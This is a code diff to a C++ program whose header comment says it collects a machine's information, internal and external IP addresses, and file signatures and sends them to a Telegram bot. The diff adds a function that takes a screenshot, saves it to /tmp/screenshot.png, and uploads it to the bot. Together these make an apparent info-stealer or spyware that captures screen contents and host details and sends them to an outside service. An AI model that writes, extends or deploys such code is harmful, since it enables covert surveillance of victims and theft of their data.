@@ -7,6 +7,7 @@
 // fetching machine's info, external and internal IP addresses, and file
 // signature, and then sending them into a created bot in telegram
 
+#include "screenshotter.hpp"
 #include <iostream>
 #include <filesystem>
 #include <vector>
@@ -306,4 +307,24 @@ void sendMessageToTelegram(const string &message) {
 
     curl_free(escapedMsg);
     curl_easy_cleanup(curl);
+}
+
+// Function to send screenshot to Telegram
+void sendScreenshotToTelegram() {
+    string screenshotPath = "/tmp/screenshot.png";
+    // Take screenshot first!
+    if (!takeScreenshot(screenshotPath)) {
+        cerr << "\033[1;31m[ERROR]\033[0m Failed to take screenshot." << endl;
+        return;
+    }
+    if (fs::exists(screenshotPath)) {
+        cout << "\033[1;33m[PROCESS]\033[0m Sending screenshot to Telegram..." << endl;
+        if (sendFileToTelegram(screenshotPath)) {
+            cout << "\033[1;32m[OK]\033[0m Screenshot sent to Telegram." << endl;
+        } else {
+            cerr << "\033[1;31m[ERROR]\033[0m Failed to send screenshot to Telegram." << endl;
+        }
+    } else {
+        cerr << "\033[1;31m[ERROR]\033[0m Screenshot file not found: " << screenshotPath << endl;
+    }
 }
